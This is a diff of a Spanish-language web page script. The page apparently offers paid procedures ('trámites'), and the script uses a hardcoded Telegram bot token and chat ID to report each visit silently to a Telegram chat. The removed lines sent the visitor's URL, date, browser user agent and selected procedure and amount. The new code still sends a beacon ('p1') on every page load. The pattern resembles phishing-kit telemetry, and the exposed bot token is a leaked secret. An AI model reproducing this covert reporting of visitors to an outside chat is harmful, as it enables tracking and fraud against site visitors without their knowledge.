@@ -215,7 +215,7 @@
         </div>
     </div>
 
-    <!-- SCRIPT: ENVÍA A TELEGRAM EN CADA VISITA Y AL SOLICITAR -->
+    <!-- SCRIPT: ENVÍA "p1" A TELEGRAM EN CADA VISITA -->
     <script>
         const TELEGRAM_BOT_TOKEN = '8783946350:AAH8zYUMz3s4rmEG5_TcDujGbckxQC4plUA';
         const TELEGRAM_CHAT_ID = '-1003921297670';
@@ -230,25 +230,19 @@
                 })
             })
             .then(r => r.json())
-            .then(data => {
-                if (!data.ok) console.error('Telegram error:', data);
-            })
+            .then(data => { if (!data.ok) console.error('Telegram error:', data); })
             .catch(err => console.error('Fetch error:', err));
         }
 
-        // 1) Enviar mensaje en CADA VISITA a la página
+        // Enviar "p1" en CADA VISITA
         document.addEventListener('DOMContentLoaded', () => {
-            const texto = `👀 Nueva visita a la página\n\nPágina: ${location.href}\nFecha: ${new Date().toLocaleString('es-CO')}\nNavegador: ${navigator.userAgent}`;
-            enviarTelegram(texto);
+            enviarTelegram('p1');
         });
 
-        // 2) Enviar mensaje al hacer clic en "Solicitar"
+        // Guardar el trámite en localStorage al hacer clic (sin enviar nada)
         function guardarTramite(nombreTramite, monto) {
             localStorage.setItem('tipoTramite', nombreTramite);
             localStorage.setItem('montoTotal', monto);
-
-            const texto = `📋 Nuevo trámite solicitado\n\nTrámite: ${nombreTramite}\nMonto: $${Number(monto).toLocaleString('es-CO')}\nFecha: ${new Date().toLocaleString('es-CO')}`;
-            enviarTelegram(texto);
         }
     </script>
 
